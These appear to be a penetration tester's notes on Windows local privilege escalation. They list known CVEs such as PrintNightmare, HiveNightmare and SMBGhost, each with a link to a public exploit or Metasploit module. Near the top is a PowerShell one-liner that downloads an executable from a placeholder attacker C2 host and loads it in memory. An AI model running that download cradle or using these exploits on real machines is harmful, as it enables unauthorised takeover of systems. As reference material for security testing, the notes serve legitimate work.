---
title: Privilege Escalation Exploits
---

[[notes/windows/escalation]] trough local exploits.

Detect LPEs due to missing patches.

=== "[[notes/tools/moriarty]]"
    ~~~ powershell
    $a=[System.Reflection.Assembly]::Load([byte[]](iwr -useb 'https://c2.attacker.com/moriarty.exe' | Select-Object -ExpandProperty Content))
    [Moriarty.Program]::Main()
    ~~~

# Local Privilege Escalation in Lenovo System Updater / CVE-2023–4632

Lenovo Updater up to and including version 5.08.01.0009 is vulnerable to arbitrary file write.

References:

- [CVE-2023–4632: Local Privilege Escalation in Lenovo System Updater](http://web.archive.org/web/20231026182546/https://scribe.rip/@specterops/cve-2023-4632-local-privilege-escalation-in-lenovo-system-updater-2762e9667120)

# SuperProfile User Profile / [CVE-2022-26904](https://www.opencve.io/cve/CVE-2022-26904)

Exploit with Metasploit [exploit/windows/local/cve_2022_26904_superprofile](https://github.com/rapid7/metasploit-framework/pull/16382).

# CallbackHell / [CVE-2021-40449](https://www.opencve.io/cve/CVE-2021-40449)

Exploit with [ly4k/callbackhell/](https://github.com/ly4k/CallbackHell).

# InstallerFileTakeOver / [CVE-2021-41379](https://www.opencve.io/cve/CVE-2021-41379)

Exploit with [klinix5/installerfiletakeover](https://github.com/klinix5/installerfiletakeover).

# Hive Nightmare / Summer of SAM / [CVE-2021-36934](https://www.opencve.io/cve/CVE-2021-36934)

Read SAM registry hive trough a shadow copy.

# PrintNightmare / [CVE-2021-1675](https://www.opencve.io/cve/CVE-2021-1675)

Exploit with [calebstewart/cve-2021-1675](https://github.com/calebstewart/CVE-2021-1675/).

# Perfusion

Exploit with [itm4n/perfusion](https://github.com/itm4n/perfusion) on Windows 7, Windows 8, Windows Server 2008 R2 and Windows Server 2012.

# SMBGhost / [CVE-2020-0796](https://www.opencve.io/cve/CVE-2020-0796)

Exploit with Metasploit `exploit/windows/local/cve_2020_0796_smbghost` or [danigargu/cve-2020-0796](https://github.com/danigargu/cve-2020-0796).

References:

- [Exploiting SMBGhost for a local privilege escalation: Writeup + POC](http://web.archive.org/web/20221206220055/https://blog.zecops.com/research/exploiting-smbghost-cve-2020-0796-for-a-local-privilege-escalation-writeup-and-poc/)
